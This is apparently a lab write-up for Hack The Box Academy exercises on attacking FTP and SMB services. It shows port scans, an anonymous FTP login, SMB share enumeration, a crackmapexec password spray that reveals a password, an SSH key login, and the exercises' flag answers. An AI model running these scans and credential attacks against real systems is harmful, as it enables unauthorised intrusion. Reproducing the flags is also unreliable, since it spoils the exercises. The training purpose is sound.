# Attacking FTP

#### Questions

Answer the question(s) below to complete this Section and earn cubes!

Target(s): 10.129.245.1 (ACADEMY-ATTCOMSVC-LIN)   

Life Left: 117 minute(s)  Terminate 

+ 1  What port is the FTP service running on?

Quét 10.129.245.1 không ra ftp nên thử host khác

```zsh
❯ nmap -sn 10.129.245.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-02 01:32 EDT
Nmap scan report for 10.129.245.1
Host is up (0.29s latency).
Nmap scan report for 10.129.245.118
Host is up (0.36s latency).
Nmap scan report for 10.129.245.130
Host is up (0.35s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 64.69 seconds
```

```zsh
❯ sudo nmap -sS -p- 10.129.245.130  -T 4 --min-rate 3000 -v -Pn
Nmap scan report for 10.129.245.130
Host is up (0.30s latency).
Not shown: 65493 closed tcp ports (reset)
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
25/tcp    open     smtp
53/tcp    open     domain
80/tcp    open     http
110/tcp   open     pop3
111/tcp   open     rpcbind
143/tcp   open     imap
993/tcp   open     imaps
995/tcp   open     pop3s
2570/tcp  filtered hs-port
7487/tcp  filtered unknown
7525/tcp  filtered unknown
8080/tcp  open     http-proxy
10807/tcp filtered unknown
15733/tcp filtered unknown
17412/tcp filtered unknown
19030/tcp filtered unknown
20648/tcp filtered unknown
21742/tcp filtered unknown
22748/tcp filtered unknown
22843/tcp filtered unknown
23273/tcp filtered unknown
25427/tcp filtered unknown
27525/tcp filtered unknown
27814/tcp filtered unknown
29206/tcp filtered unknown
29209/tcp filtered unknown
29468/tcp filtered unknown
29570/tcp filtered unknown
31948/tcp filtered iceedcp_tx
33458/tcp filtered unknown
37049/tcp filtered unknown
38603/tcp filtered unknown
42207/tcp filtered unknown
46969/tcp filtered unknown
57773/tcp filtered unknown
58260/tcp filtered unknown
60248/tcp filtered unknown
61980/tcp filtered unknown
65015/tcp filtered unknown
65039/tcp filtered unknown

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 42.81 seconds
           Raw packets sent: 123267 (5.424MB) | Rcvd: 69648 (2.786MB)
```

+ 1  What username is available for the FTP server?

```zsh
└──╼ [★]$ ftp 10.129.245.130 21
Connected to 10.129.245.130.
220 (vsFTPd 3.0.3)
Name (10.129.245.130:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43937|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              38 May 30  2022 flag.txt
```


+ 1  Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer.

```zsh
❯ cat flag.txt
HTB{0eb0ab788df18c3115ac43b1c06ae6c4}
```

# Attacking SMB

Target(s): 10.129.245.1 (ACADEMY-ATTCOMSVC-LIN)   

Life Left: 146 Terminate 

+ 1  What is the name of the shared folder with READ permissions?

```zsh
❯ smbmap -H 10.129.245.1
[+] IP: 10.129.245.1:445        Name: 10.129.245.1              Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        GGJ                                                     READ ONLY       Priv
        IPC$                                                    NO ACCESS       IPC Service (attcsvc-linux Samba)
```

+ 1  What is the password for the username "jason"?

```zsh
❯ crackmapexec smb 10.129.245.1 -u jason -p pws.list --local-auth
SMB         10.129.245.1    445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh
```

+ 1  Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.
Không thể dùng mật khẩu:
![](images/1.png)

Lấy key ssh

![](images/2.png)

```zsh
❯ chmod 600 id_rsa
❯ ssh -i id_rsa jason@10.129.245.1
$ cat flag.txt  
HTB{SMB_4TT4CKS_2349872359}
```

